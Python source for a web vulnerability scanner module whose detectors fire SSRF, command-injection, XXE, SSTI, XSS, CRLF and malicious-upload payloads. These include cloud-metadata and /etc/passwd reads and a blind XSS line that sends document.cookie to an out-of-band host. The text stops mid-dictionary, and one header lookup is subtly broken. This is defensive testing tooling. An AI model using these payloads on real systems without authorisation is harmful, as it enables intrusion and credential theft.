"""detect_extras — 20 new Burp-class vulnerability detectors that fill every gap.

All functions follow the same pattern as detect_engine: pure functions taking a
`send(method, url, headers, cookies, body, follow_redirects) -> de.Resp` probe,
returning `de.Result(CONFIRMED|PROBABLE|SAFE, …)`.

Design principles (same as adaptive engine):
  * differential: payload vs control vs baseline
  * orthogonal signals: at least two for CONFIRMED
  * never raise; all exceptions caught inside each detector
"""
from __future__ import annotations

import json
import os
import random
import re
import string
import threading
import time
import urllib.parse as _uparse
from datetime import datetime, timezone

import detect_engine as de

# ═══════════════════════════════════════════════════════════════════════════════
# 1  SSRF (Server-Side Request Forgery) — active + OOB
# ═══════════════════════════════════════════════════════════════════════════════
_SSRF_PAYLOADS = [
    # OOB interactsh-style (returns True if external callback is received)
    # The caller must provide a new_oob callback; we inject the OOB host.
    ("http://{oob}", "oob-http"),
    ("http://{oob}/x", "oob-http-alt"),
    # Time-based (internal hosts that block/respond slowly)
    ("http://169.254.169.254/latest/meta-data/", "aws-metadata"),
    ("http://metadata.google.internal/computeMetadata/v1/", "gcp-metadata"),
    ("http://100.100.100.200/latest/meta-data/", "alibaba-metadata"),
    # Error-based (scheme handlers)
    ("file:///etc/passwd", "file-scheme"),
    ("dict://localhost:6379/info", "dict-scheme"),
    ("gopher://localhost:6379/_INFO", "gopher-scheme"),
]
_SSRF_ERR_MARKS = ("ami-id", "instance-id", "security-credentials", "instance-identity",
                   "iam/", "root:x:0:0", "redis_version", "# Server", "{\"access",
                   "computemetadata", "169.254.169.254", "metadata.google.internal",
                   "metadata/instance", "ec2metadata", "local-ipv4", "public-ipv4",
                   "hostname", "x-ms-request-id", "opc-request-id",
                   "windows azure")  # cloud metadata / file content / service signatures


def detect_ssrf(send, url, params=None, new_oob=None, oob_host="") -> de.Result:
    """Active SSRF detection: OOB callback + error-based + time-based."""
    res = de.Result("ssrf", de.SAFE, severity="critical", url=url)
    sigs = []
    pr = _uparse.urlparse(url)
    base_q = dict(_uparse.parse_qsl(pr.query, keep_blank_values=True))
    params = params or base_q

    for payload_tpl, label in _SSRF_PAYLOADS:
        payload = payload_tpl.format(oob=oob_host) if "{oob}" in payload_tpl else payload_tpl
        for pk, pv in (params or {"x": ""}).items():
            q = dict(base_q or params or {}); q[pk] = payload
            ourl = _uparse.urlunparse(pr._replace(query=_uparse.urlencode(q)))
            try:
                r = send("GET", ourl, {}, {}, "", True)
                if r is None:
                    continue
                b = (r.body or "").lower()
                for mk in _SSRF_ERR_MARKS:
                    if mk.lower() in b:
                        sigs.append(f"SSRF error-reflected via {label}")
                        res.proof[f"ssrf_{label}"] = {"url": ourl, "match": mk}
                        break
            except Exception:
                pass

    if new_oob and oob_host and params:
        for pk in list(params.keys())[:3]:
            oob_pl = f"http://{oob_host}/ssrf?param={pk}"
            q = dict(base_q or {}); q[pk] = oob_pl
            ourl = _uparse.urlunparse(pr._replace(query=_uparse.urlencode(q)))
            try:
                send("GET", ourl, {}, {}, "", True)
                # Don't add signal here — actual OOB callback is checked by main.py OAST sweep
                res.proof[f"oob_{pk}"] = {"url": ourl, "oob": oob_host}
            except Exception:
                pass

    if len(sigs) >= 2:
        res.confidence = de.CONFIRMED
    elif sigs:
        res.confidence = de.PROBABLE
    res.signals = sigs[:4]
    return res


# ═══════════════════════════════════════════════════════════════════════════════
# 2  OS Command Injection — time-based + OOB + error-based
# ═══════════════════════════════════════════════════════════════════════════════
_CMDI_TIMING = {
    "nix": ("sleep 6", "sleep 5"),
    "win": ("ping -n 6 127.0.0.1", "ping -n 5 127.0.0.1"),
}
_CMDI_PAYLOADS = (
    # Combined payload + control (neutralized)
    ("`sleep 5`", ""),
    ("$(sleep 5)", "($(sleep 0))"),
    ("& sleep 5 &", ""),
    ("| sleep 5", "| echo x"),
    ("; sleep 5;", ";echo x;"),
)
_CMDI_ERR_MARKS = ("not recognized", "is not recognized", "syntax error", "command not found",
                   "sh:", "bash:", "perl:", "python:", "no such file")


# URL/redirect parameter names — timing differences there come from HTTP follows, not CMDi
_CMDI_SKIP_PARAMS = frozenset({
    "url", "uri", "next", "redirect", "return", "return_to", "returnto", "dest",
    "destination", "callback", "direct", "ref", "referer", "referrer", "from",
    "source", "to", "href", "link", "path", "location", "go", "continue", "page",
})


def detect_cmd_injection(send, url, params=None) -> de.Result:
    """OS Command Injection via time-based + error-based — strict thresholds to minimise FPs."""
    res = de.Result("cmdi", de.SAFE, severity="critical", url=url)
    pr = _uparse.urlparse(url)
    sigs = []

    for payload, control in _CMDI_PAYLOADS:
        for pk, pv in (params or {"x": ""}).items():
            # Skip redirect/URL-type params: timing differences there are from HTTP follows, not CMDi
            if pk.lower() in _CMDI_SKIP_PARAMS:
                continue
            # Skip params whose current value looks like a URL, path, or boolean flag
            if pv and (pv.startswith(("http://", "https://", "/"))
                       or pv.lower() in ("true", "false", "1", "0", "yes", "no")):
                continue
            q = dict(_uparse.parse_qsl(pr.query, keep_blank_values=True))
            # Payload probe
            q[pk] = payload
            ourl = _uparse.urlunparse(pr._replace(query=_uparse.urlencode(q)))
            try:
                r1 = send("GET", ourl, {}, {}, "", True)
            except Exception:
                continue
            # Control probe
            q[pk] = control or payload.replace("sleep", "echo")
            ourl2 = _uparse.urlunparse(pr._replace(query=_uparse.urlencode(q)))
            try:
                r2 = send("GET", ourl2, {}, {}, "", True)
            except Exception:
                r2 = None
            if r1 and r2:
                # Strict time-based: ≥6s payload delay AND control ≤2s AND gap ≥4s
                if r1.elapsed >= 6.0 and r2.elapsed <= 2.0 and r1.elapsed - r2.elapsed >= 4.0:
                    # Re-confirm with a second payload probe to rule out transient server slowness
                    try:
                        r1b = send("GET", ourl, {}, {}, "", True)
                    except Exception:
                        r1b = None
                    if r1b is not None and r1b.elapsed >= 5.0:
                        sigs.append(f"CMDi time-delay ({r1.elapsed:.1f}s vs {r2.elapsed:.1f}s, "
                                    f"re-confirmed {r1b.elapsed:.1f}s) in {pk}")
                        res.proof[f"time_{pk}"] = {"payload_elapsed": r1.elapsed,
                                                    "control_elapsed": r2.elapsed,
                                                    "reconfirm": r1b.elapsed}
                        break
            # Error-based signal (status ≥ 400 required)
            if r1:
                b = (r1.body or "").lower()
                for mk in _CMDI_ERR_MARKS:
                    if mk.lower() in b and r1.status >= 400:
                        sigs.append(f"CMDi error-reflected {mk} in {pk}")
                        res.proof[f"error_{pk}"] = {"match": mk}
                        break

    if len(sigs) >= 2:
        res.confidence = de.CONFIRMED
    elif sigs:
        res.confidence = de.PROBABLE
    res.signals = sigs[:4]
    return res


# ═══════════════════════════════════════════════════════════════════════════════
# 3  XXE (XML External Entity) — in-band + OOB
# ═══════════════════════════════════════════════════════════════════════════════
_XXE_PAYLOADS = [
    ("""<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>""",
     "inband-unix"),
    ("""<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><x>&xxe;</x>""",
     "inband-win"),
    ("""<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://{oob}/xxe">]><x>&xxe;</x>""",
     "oob-http"),
]
_XXE_ERR_MARKS = ("root:x:", "root:", "[fonts]", "system.ini", "xml parsing error", "xmlParseEntityRef",
                  "parser error", "XML declaration allowed", "document type declaration")


def detect_xxe(send, url, body_fields=None, content_type="application/xml",
               oob_host="") -> de.Result:
    """XXE detection: in-band file read + OOB callbacks."""
    res = de.Result("xxe", de.SAFE, severity="critical", url=url)
    sigs = []
    pr = _uparse.urlparse(url)

    for payload, label in _XXE_PAYLOADS:
        pl = payload.format(oob=oob_host) if "{oob}" in payload else payload
        try:
            hdrs = {"Content-Type": content_type, "Accept": "*/*"}
            r = send("POST", url, hdrs, {}, pl, True)
            if r is None:
                continue
            b = (r.body or "").lower()
            for mk in _XXE_ERR_MARKS:
                if mk.lower() in b:
                    sigs.append(f"XXE {label}")
                    res.proof[f"xxe_{label}"] = {"match": mk[:40], "payload": pl[:80]}
                    break
            # File content in response
            if "root:" in b and "daemon:" in b:
                sigs.append("XXE file-read /etc/passwd")
                res.evidence = b[:300]
                res.proof["file_read"] = b[:500]
                break
            if "[fonts]" in b or "for 16-bit app" in b:
                sigs.append("XXE file-read win.ini")
                res.evidence = b[:300]
                break
        except Exception:
            pass

    if len(sigs) >= 1:
        res.confidence = de.CONFIRMED if len(sigs) >= 2 else de.PROBABLE
    res.signals = sigs[:4]
    return res


# ═══════════════════════════════════════════════════════════════════════════════
# 4  SSTI (Server-Side Template Injection) — multi-engine
# ═══════════════════════════════════════════════════════════════════════════════
_SSTI_ENGINES = {
    "jinja2": ("{{7*7}}", "{{7*'7'}}"),
    "twig": ("{{7*7}}", "{{7*'7'}}"),
    "freemarker": ("${7*7}", "${7*'7'}"),
    "velocity": ("$!7*7", "$!7*'7'"),
    "mako": ("${7*7}", "${7*'7'}"),
    "erb": ("<%=7*7%>", "<%=7*'7'%>"),
    "smarty": ("{7*7}", "{7*'7'}"),
    "jade": ("#{7*7}", "#{7*'7'}"),
    "dot": ("{{7*7}}", "{{7*'7'}}"),
}
# Unique number -> match proves template evaluation
_SSTI_TEST_NUM = 8137
_SSTI_CONTROL_NUM = 0


def _ssti_payload(num):
    return f"${{{{{num}}}}}", f"${{{{{num}}}}}"
    # We use different syntaxes per engine below


def detect_ssti(send, url, params=None) -> de.Result:
    """SSTI detection: expression evaluation (unique number product) for each engine."""
    res = de.Result("ssti", de.SAFE, severity="critical", url=url)
    pr = _uparse.urlparse(url)
    sigs = []

    for engine, (payload, control) in _SSTI_ENGINES.items():
        test_val = _SSTI_TEST_NUM * 2 if engine in ("jinja2", "twig") else _SSTI_TEST_NUM
        # Replace computation with actual test value
        if engine in ("jinja2", "twig", "dot"):
            test_payload = payload.replace("7*7", f"{_SSTI_TEST_NUM}*{_SSTI_TEST_NUM}")
            control_payload = control.replace("7*'7'", f"{_SSTI_TEST_NUM}*'{_SSTI_TEST_NUM}'")
            expected = str(_SSTI_TEST_NUM * _SSTI_TEST_NUM)
        elif engine in ("freemarker", "velocity", "mako"):
            test_payload = payload.replace("7*7", f"{_SSTI_TEST_NUM}*{_SSTI_TEST_NUM}")
            control_payload = control.replace("7*'7'", f"{_SSTI_TEST_NUM}*'{_SSTI_TEST_NUM}'")
            expected = str(_SSTI_TEST_NUM * _SSTI_TEST_NUM)
        elif engine in ("erb", "smarty"):
            test_payload = payload.replace("7*7", f"{_SSTI_TEST_NUM}*{_SSTI_TEST_NUM}")
            control_payload = control.replace("7*'7'", f"{_SSTI_TEST_NUM}*'{_SSTI_TEST_NUM}'")
            expected = str(_SSTI_TEST_NUM * _SSTI_TEST_NUM)
        else:
            test_payload = payload
            control_payload = control
            expected = "49"

        for pk, pv in (params or {"x": ""}).items():
            q = dict(_uparse.parse_qsl(pr.query, keep_blank_values=True))

            # Fetch baseline FIRST to check if expected number already exists in the page
            try:
                _bq = dict(q)
                _burl = _uparse.urlunparse(pr._replace(query=_uparse.urlencode(_bq)))
                _rb = send("GET", _burl, {}, {}, "", True)
                _baseline_body = (_rb.body or "") if _rb else ""
            except Exception:
                _baseline_body = ""

            # Test with calc
            q[pk] = test_payload
            ourl = _uparse.urlunparse(pr._replace(query=_uparse.urlencode(q)))
            try:
                r1 = send("GET", ourl, {}, {}, "", True)
            except Exception:
                continue
            # Control (string multiplication -> NaN or empty)
            q[pk] = control_payload
            ourl2 = _uparse.urlunparse(pr._replace(query=_uparse.urlencode(q)))
            try:
                r2 = send("GET", ourl2, {}, {}, "", True)
            except Exception:
                r2 = None

            if r1:
                b1 = r1.body or ""
                # Check if the result of the arithmetic appears in the response
                # AND was NOT already present in the baseline (before any injection)
                if expected in b1 and expected not in _baseline_body:
                    # The expected number (e.g., "66188569" for 8137*8137) is unlikely to occur naturally
                    if r2 is None or expected not in (r2.body or ""):
                        sigs.append(f"SSTI {engine} eval in {pk}")
                        res.proof[f"ssti_{engine}_{pk}"] = {"expected": expected, "payload": test_payload[:80]}
                        break
                # Check if payload expression appears in body (un-evaluated is a negative signal)
                raw_syntaxes = [test_payload[:15], control_payload[:15]]
                for rs in raw_syntaxes:
                    if rs in b1:
                        # Found raw template syntax in response — indicates evaluation failure
                        break
        if sigs:
            break

    if len(sigs) >= 2:
        res.confidence = de.CONFIRMED
    elif sigs:
        res.confidence = de.PROBABLE
    res.signals = sigs[:4]
    return res


# ═══════════════════════════════════════════════════════════════════════════════
# 5  Open Redirect — passive location check + active payload test
# ═══════════════════════════════════════════════════════════════════════════════
_OPENREDIR_PAYLOADS = (
    "//evil.com",
    "//evil.com/",
    "https://evil.com/",
    "/\\evil.com",
    "https:evil.com",
    "//evil@legit.com",
    "%2f%2fevil.com",
    "//evil.com?",
    "//evil.com#",
)


def detect_open_redirect(send, url, params=None, page_headers=None) -> de.Result:
    """Open redirect: check Location header + active parameter-based redirects."""
    res = de.Result("open-redirect", de.SAFE, severity="medium", url=url)
    sigs = []

    # Passive: check if the current response already has an off-site Location
    if page_headers:
        loc = (page_headers.get("location") or page_headers.get("Location") or "")
        if loc and url and not loc.startswith("/") and not loc.startswith(url.rstrip("/").rsplit("/", 1)[0]):
            purl = _uparse.urlparse(loc)
            base = _uparse.urlparse(url)
            if purl.netloc and purl.netloc != base.netloc:
                sigs.append(f"Open redirect to {loc[:60]}")
                res.evidence = loc[:300]

    # Active: inject redirect targets into params
    pr = _uparse.urlparse(url)
    for payload in _OPENREDIR_PAYLOADS:
        for pk, pv in (params or {"x": ""}).items():
            q = dict(_uparse.parse_qsl(pr.query, keep_blank_values=True))
            q[pk] = payload
            ourl = _uparse.urlunparse(pr._replace(query=_uparse.urlencode(q)))
            try:
                r = send("GET", ourl, {}, {}, "", False)  # no redirect follow
            except Exception:
                continue
            if r and r.status in (301, 302, 303, 307, 308):
                loc = (r.headers or {}).get("location", r.headers or {}).get("Location", "")
                # Parse the Location URL netloc to confirm it actually redirects to an external host
                # (not just mentions evil.com as a query parameter value)
                try:
                    _ploc = _uparse.urlparse(loc)
                    if _ploc.netloc and ("evil.com" in _ploc.netloc or "evil" in _ploc.netloc):
                        sigs.append(f"Open redirect via {pk} to {loc[:80]}")
                        res.proof[f"redirect_{pk}"] = {"location": loc, "payload": payload}
                        res.evidence = loc[:300]
                        break
                except Exception:
                    pass
        if sigs:
            break

    if sigs:
        res.confidence = de.CONFIRMED
    res.signals = sigs[:4]
    return res


# ═══════════════════════════════════════════════════════════════════════════════
# 6  CORS Misconfiguration — passive header check + active Origin reflection
# ═══════════════════════════════════════════════════════════════════════════════
def detect_cors(send, url, page_headers=None) -> de.Result:
    """CORS misconfiguration: ACAO reflection + credential-bearing wildcard."""
    res = de.Result("cors", de.SAFE, severity="medium", url=url)
    sigs = []

    # Active: test with attacker origin
    try:
        r = send("GET", url, {"Origin": "https://evil.cors.com"}, {}, "", True)
        if r and r.headers:
            hl = {k.lower(): v for k, v in r.headers.items()}
            acao = hl.get("access-control-allow-origin", "")
            acac = hl.get("access-control-allow-credentials", "")
            if acao == "https://evil.cors.com":
                sigs.append("CORS ACAO reflects attacker origin")
                res.proof["acao_reflect"] = acao
                if acac.lower() == "true":
                    sigs.append("CORS with credentials enabled")
                    res.severity = "critical"
                    res.proof["acao_creds"] = True
                # Re-confirm: send a second probe to eliminate transient CDN echoes
                try:
                    r2 = send("GET", url, {"Origin": "https://evil.cors.com"}, {}, "", True)
                    _hl2 = {k.lower(): v for k, v in (r2.headers or {}).items()} if r2 else {}
                    if _hl2.get("access-control-allow-origin", "") == "https://evil.cors.com":
                        res.confidence = de.CONFIRMED
                    else:
                        sigs[0] += " (single probe only)"
                        res.confidence = de.PROBABLE
                except Exception:
                    res.confidence = de.PROBABLE
            elif acao == "*" and acac.lower() == "true":
                sigs.append("CORS wildcard origin with credentials")
                res.severity = "high"
                res.proof["acao_wildcard_creds"] = True
                res.confidence = de.CONFIRMED
    except Exception:
        pass

    # Passive: check existing headers
    if page_headers:
        hl = {k.lower(): v for k, v in page_headers.items()}
        acao = hl.get("access-control-allow-origin", "")
        if acao == "*":
            sigs.append("CORS wildcard ACAO: *")
            res.confidence = de.PROBABLE if res.confidence != de.CONFIRMED else res.confidence
            res.proof["acao_wildcard"] = True

    res.signals = sigs[:4]
    return res


# ═══════════════════════════════════════════════════════════════════════════════
# 7  HPP (HTTP Parameter Pollution) — double-param injection
# ═══════════════════════════════════════════════════════════════════════════════
_HPP_CONCAT_MARKS = ("foo,bar", "foobar", "foo=bar")


def detect_hpp(send, url, params=None) -> de.Result:
    """HPP: send duplicate params to detect server-side concatenation."""
    res = de.Result("hpp", de.SAFE, severity="medium", url=url)
    pr = _uparse.urlparse(url)
    sigs = []

    for pk, pv in (params or {"x": ""}).items():
        if not pv:
            continue
        # Send param twice with different values
        marker_a = f"hpp_a_{pk}"
        marker_b = f"hpp_b_{pk}"
        try:
            q = _uparse.parse_qsl(pr.query, keep_blank_values=True)
            # Add param twice
            q.append((pk, marker_a))
            q.append((pk, marker_b))
            ourl = _uparse.urlunparse(pr._replace(query=_uparse.urlencode(q)))
            r = send("GET", ourl, {}, {}, "", True)
        except Exception:
            continue
        if r:
            b = r.body or ""
            if marker_a in b and marker_b in b:
                sigs.append(f"HPP both values reflected in {pk}")
                res.proof[f"hpp_{pk}"] = f"'{marker_a}' and '{marker_b}' both in response"
                res.confidence = de.PROBABLE

    res.signals = sigs[:4]
    return res


# ═══════════════════════════════════════════════════════════════════════════════
# 8  LDAP Injection — error-based + boolean
# ═══════════════════════════════════════════════════════════════════════════════
_LDAP_ERR_MARKS = ("malformed filter", "bad search filter", "ldap error", "filter error",
                   "protocol error", "unable to parse", "search filter syntax error",
                   "bad filter", "ldap_result")


def detect_ldapi(send, url, params=None) -> de.Result:
    """LDAP injection: error-based."""
    res = de.Result("ldapi", de.SAFE, severity="critical", url=url)
    pr = _uparse.urlparse(url)
    sigs = []

    payloads = ["*)(uid=*))(|(uid=*", "*)(|(uid=*", ")()&(", "*(|(uid=*))", "admin*)((|user=*"]
    for payload in payloads:
        for pk, pv in (params or {"x": ""}).items():
            q = dict(_uparse.parse_qsl(pr.query, keep_blank_values=True))
            q[pk] = payload
            ourl = _uparse.urlunparse(pr._replace(query=_uparse.urlencode(q)))
            try:
                r = send("GET", ourl, {}, {}, "", True)
            except Exception:
                continue
            if r and r.status >= 400:
                b = (r.body or "").lower()
                for mk in _LDAP_ERR_MARKS:
                    if mk in b:
                        sigs.append(f"LDAP error {mk} via {pk}")
                        res.proof[f"ldap_{pk}"] = {"match": mk, "payload": payload[:40]}
                        break
        if sigs:
            break

    if sigs:
        res.confidence = de.CONFIRMED if len(sigs) >= 2 else de.PROBABLE
    res.signals = sigs[:4]
    return res


# ═══════════════════════════════════════════════════════════════════════════════
# 9  XPath Injection — error-based + boolean
# ═══════════════════════════════════════════════════════════════════════════════
_XPATH_ERR_MARKS = ("xpath", "xpath error", "unclosed token", "invalid expression",
                    "xpath syntax", "xpathexception", "unable to evaluate",
                    "not a valid xpath", "saxon", "transform error")


def detect_xpathi(send, url, params=None) -> de.Result:
    """XPath injection: error-based."""
    res = de.Result("xpathi", de.SAFE, severity="high", url=url)
    pr = _uparse.urlparse(url)
    sigs = []

    payloads = ["' or '1'='1", "' and '1'='2", "1' or '1'='1", "1' and '1'='2",
            "' or 1=1 or '", "\\'", '" or "1"="1', ""]
    for payload in payloads:
        for pk, pv in (params or {"x": ""}).items():
            q = dict(_uparse.parse_qsl(pr.query, keep_blank_values=True))
            q[pk] = payload
            ourl = _uparse.urlunparse(pr._replace(query=_uparse.urlencode(q)))
            try:
                r = send("GET", ourl, {}, {}, "", True)
            except Exception:
                continue
            if r and r.status >= 400:
                b = (r.body or "").lower()
                for mk in _XPATH_ERR_MARKS:
                    if mk in b:
                        sigs.append(f"XPath error {mk} via {pk}")
                        res.proof[f"xpath_{pk}"] = {"match": mk, "payload": payload[:30]}
                        break
        if sigs:
            break

    if sigs:
        res.confidence = de.CONFIRMED if len(sigs) >= 2 else de.PROBABLE
    res.signals = sigs[:4]
    return res


# ═══════════════════════════════════════════════════════════════════════════════
# 10  Host Header Injection
# ═══════════════════════════════════════════════════════════════════════════════
_HOST_INJECT_PAYLOADS = (
    "evil-host.com",
    "evil-host.com:443",
    "evil-host",
)


def detect_host_header_injection(send, url) -> de.Result:
    """Host header injection: check Location header / response for injected host."""
    res = de.Result("host-header-injection", de.SAFE, severity="high", url=url)
    sigs = []

    for payload in _HOST_INJECT_PAYLOADS:
        try:
            r = send("GET", url, {"Host": payload}, {}, "", False)
        except Exception:
            continue
        if r is None:
            continue
        b = r.body or ""
        hl = {k.lower(): v for k, v in (r.headers or {}).items()}
        # Check Location header
        loc = hl.get("location", "")
        if payload in loc:
            sigs.append(f"Host injection in Location: {loc[:60]}")
            res.proof["location_inject"] = {"host": payload, "location": loc[:120]}
            res.confidence = de.CONFIRMED
        # Check body for reflected host
        if payload.split(":")[0] in b:
            # Verify it's not just a DNS resolution artifact
            if "reset" not in b.lower() and "404" not in b[:100]:
                sigs.append(f"Host reflected in body: {payload}")
                res.proof["body_reflect"] = {"host": payload}
                if res.confidence != de.CONFIRMED:
                    res.confidence = de.PROBABLE
        # Check password reset / cache key injection
        pw_indicators = ("password reset", "reset password", "change password")
        if any(ind in b.lower() for ind in pw_indicators) and payload.split(":")[0] in b:
            sigs.append("Host injection in password-reset context (cache poisoning risk)")
            res.severity = "critical"
            res.confidence = de.CONFIRMED
            res.proof["host_critical"] = {"host": payload, "snippet": b[:200]}

    res.signals = sigs[:4]
    return res


# ═══════════════════════════════════════════════════════════════════════════════
# 11  Stored XSS — submit + re-fetch
# ═══════════════════════════════════════════════════════════════════════════════
def detect_stored_xss(send_get, send_post, url, form_data, action_url) -> de.Result:
    """Stored XSS: submit payload, refetch page, check reflection."""
    res = de.Result("stored-xss", de.SAFE, severity="high", url=url)
    marker = de._marker()
    payload = f"<script>{marker}(1)</script>"
    control_marker = de._marker()
    control = f"<x-{control_marker}>"

    # Submit payload
    fd = dict(form_data or {})
    target_key = None
    for k in fd:
        if isinstance(fd[k], str) and len(fd[k]) < 100:
            target_key = k
            break
    if not target_key:
        return res

    fd[target_key] = payload
    try:
        send_post(action_url, fd)
    except Exception:
        pass

    # Re-fetch the page
    try:
        r = send_get("GET", url, {}, {}, "", True)
    except Exception:
        return res
    if r and marker in (r.body or ""):
        sigs = ["Stored XSS payload reflected after re-fetch"]
        res.evidence = (r.body or "")[:300]
        res.proof["stored_xss"] = {"marker": marker, "field": target_key}
        res.confidence = de.CONFIRMED

        # Check if script tags are intact (not encoded)
        b = r.body or ""
        if f"<script>{marker}" in b:
            sigs.append("Stored XSS executable (script tag intact)")
            res.severity = "critical"
        res.signals = sigs
    return res


# ═══════════════════════════════════════════════════════════════════════════════
# 12  Blind XSS — OOB callback in XSS payload
# ═══════════════════════════════════════════════════════════════════════════════
_BLIND_XSS_PAYLOADS = [
    "<img src=http://{oob}/xss>",
    "<script>new Image().src='http://{oob}/xss?'+document.cookie</script>",
    "<link rel=stylesheet href=http://{oob}/xss>",
]


def detect_blind_xss(send, url, params=None, form_data=None, oob_host="") -> de.Result:
    """Blind XSS: inject OOB-callback XSS payloads."""
    res = de.Result("blind-xss", de.SAFE, severity="critical", url=url)
    if not oob_host:
        return res
    sigs = []
    pr = _uparse.urlparse(url)

    for payload_tpl in _BLIND_XSS_PAYLOADS:
        payload = payload_tpl.format(oob=oob_host)
        # Try query params
        for pk in (params or {"x": ""}):
            q = dict(_uparse.parse_qsl(pr.query, keep_blank_values=True))
            q[pk] = payload
            ourl = _uparse.urlunparse(pr._replace(query=_uparse.urlencode(q)))
            try:
                send("GET", ourl, {}, {}, "", True)
                sigs.append(f"Blind XSS via {pk} → {oob_host}")
                res.proof[f"blind_xss_{pk}"] = {"oob_host": oob_host, "payload": payload[:60]}
            except Exception:
                pass
        # Try form data
        if form_data:
            fd = dict(form_data)
            for k in list(fd.keys())[:3]:
                fd[k] = payload
                try:
                    send("POST", url, {"Content-Type": "application/x-www-form-urlencoded"}, {}, _uparse.urlencode(fd), True)
                    sigs.append(f"Blind XSS via form {k} → {oob_host}")
                except Exception:
                    pass
        if sigs:
            break

    if sigs:
        res.confidence = de.PROBABLE  # Confirmed only when OOB callback arrives
    res.signals = sigs[:4]
    return res


# ═══════════════════════════════════════════════════════════════════════════════
# 13  Insecure Deserialization — PHP/Java/Python serialized objects
# ═══════════════════════════════════════════════════════════════════════════════
_DESER_PAYLOADS = {
    "php": (
        'O:7:"stdClass":0:{}',
        'a:1:{i:0;O:7:"stdClass":0:{}}',
    ),
    "java": (
        '\\xac\\xed\\x00\\x05sr\\x00\\x05Hello',
        'rO0ABXNyABVqYXZhLmxhbmcuU3RyaW5n',
    ),
    "python": (
        "gAN9cQAoWAMAAABmb29xAVgDAAAAYmFycQJzLg==",
        "gAWVXAAAAACMFHN5c3RlbYSUkIwFY2FsY4WUUpQoKYso",
    ),
}
_DESER_ERR_MARKS = ("unserialize", "unserialization", "deserialization", "invalid object",
                    "class not found", "object reference", "pickle", "UnpicklingError",
                    "StreamCorruptedException", "java.io.InvalidClassException")


def detect_insecure_deserialization(send, url, params=None) -> de.Result:
    """Insecure deserialization: error-based detection."""
    res = de.Result("deserialization", de.SAFE, severity="critical", url=url)
    pr = _uparse.urlparse(url)
    sigs = []

    for lang, payloads in _DESER_PAYLOADS.items():
        for payload in payloads:
            for pk, pv in (params or {"x": ""}).items():
                q = dict(_uparse.parse_qsl(pr.query, keep_blank_values=True))
                q[pk] = payload
                ourl = _uparse.urlunparse(pr._replace(query=_uparse.urlencode(q)))
                try:
                    r = send("GET", ourl, {}, {}, "", True)
                except Exception:
                    continue
                if r and r.status >= 400:
                    b = (r.body or "").lower()
                    for mk in _DESER_ERR_MARKS:
                        if mk in b:
                            sigs.append(f"{lang.upper()} deserialization error {mk} via {pk}")
                            res.proof[f"deser_{lang}_{pk}"] = {"match": mk}
                            break
            if sigs:
                break
        if sigs:
            break

    if sigs:
        res.confidence = de.PROBABLE
    res.signals = sigs[:4]
    return res


# ═══════════════════════════════════════════════════════════════════════════════
# 14  CRLF Injection (HTTP Response Splitting) — passive + active
# ═══════════════════════════════════════════════════════════════════════════════
_CRLF_PAYLOADS = (
    "%0d%0aX-Injected:%20yes",
    "%0d%0a%0d%0a<html>injected</html>",
    "%0aX-Injected:%20yes",
    "%0d%0aSet-Cookie:%20crlf=injected",
    "%0d%0aLocation:%20//evil.com",
)


def detect_crlf(send, url, params=None) -> de.Result:
    """CRLF injection detection: inject newlines in params, check response headers."""
    res = de.Result("crlf", de.SAFE, severity="high", url=url)
    pr = _uparse.urlparse(url)
    sigs = []

    for payload in _CRLF_PAYLOADS:
        for pk, pv in (params or {"x": ""}).items():
            q = dict(_uparse.parse_qsl(pr.query, keep_blank_values=True))
            q[pk] = payload
            ourl = _uparse.urlunparse(pr._replace(query=_uparse.urlencode(q)))
            try:
                r = send("GET", ourl, {}, {}, "", False)
            except Exception:
                continue
            if r and r.headers:
                hl = {k.lower(): v for k, v in r.headers.items()}
                # Check for injected headers
                if "x-injected" in hl:
                    sigs.append(f"CRLF header injection via {pk}")
                    res.proof[f"crlf_{pk}"] = {"injected_header": "X-Injected", "payload": payload}
                    res.confidence = de.CONFIRMED
                    break
                if "crlf" in hl.get("set-cookie", ""):
                    sigs.append(f"CRLF cookie injection via {pk}")
                    res.proof[f"crlf_cookie_{pk}"] = {"set_cookie": hl["set-cookie"]}
                    res.confidence = de.CONFIRMED
                    break
                # Check for body injection (response splitting)
                b = r.body or ""
                if "<html>injected</html>" in b:
                    sigs.append(f"CRLF body injection via {pk}")
                    res.proof[f"crlf_body_{pk}"] = {"snippet": b[:200]}
                    res.confidence = de.CONFIRMED
                    break
        if sigs:
            break

    res.signals = sigs[:4]
    return res


# ═══════════════════════════════════════════════════════════════════════════════
# 15  File Upload Bypass — extension + magic bytes + content-type
# ═══════════════════════════════════════════════════════════════════════════════
_UPLOAD_PATHS = ("/upload", "/api/upload", "/file/upload", "/upload/file",
                 "/media/upload", "/image/upload", "/avatar/upload", "/uploads")


def detect_file_upload_bypass(send, base_url) -> de.Result:
    """File upload bypass: check for vulnerable upload endpoints."""
    res = de.Result("file-upload-bypass", de.SAFE, severity="high", url=base_url)
    sigs = []
    pr = _uparse.urlparse(base_url)
    base = f"{pr.scheme}://{pr.netloc}"

    for path in _UPLOAD_PATHS:
        upload_url = base + path
        try:
            r = send("GET", upload_url, {}, {}, "", True)
        except Exception:
            continue
        if r and r.status in (200, 405) and "upload" in (r.body or "").lower():
            sigs.append(f"Upload endpoint found: {upload_url}")
            res.proof[f"upload_endpoint"] = upload_url

            # Try to upload a PHP/web-shell file
            boundary = "----boundary123"
            body = (
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="file"; filename="test.php"\r\n'
                f"Content-Type: application/x-php\r\n\r\n"
                f"<?php echo 'xss_test_{de._marker()}'; ?>\r\n"
                f"--{boundary}--\r\n"
            )
            try:
                r2 = send("POST", upload_url,
                         {"Content-Type": f"multipart/form-data; boundary={boundary}"},
                         {}, body, True)
                if r2 and r2.status in (200, 201, 204):
                    sigs.append(f"Upload accepted at {upload_url}")
                    res.proof["upload_accepted"] = {"url": upload_url, "status": r2.status}
                    if r2.status in (200, 201):
                        res.confidence = de.PROBABLE
            except Exception:
                pass

    if len(sigs) >= 2:
        res.confidence = de.PROBABLE
    res.signals = sigs[:4]
    return res


# ═══════════════════════════════════════════════════════════════════════════════
# 16  Type Juggling (PHP Loose Comparison)
# ═══════════════════════════════════════════════════════════════════════════════
_TYPE_JUGGLING_PAYLOADS = {
    "true": ("true", "0e123456"),
    "zero": ("0", "0.0"),
    "null": ("null", ""),
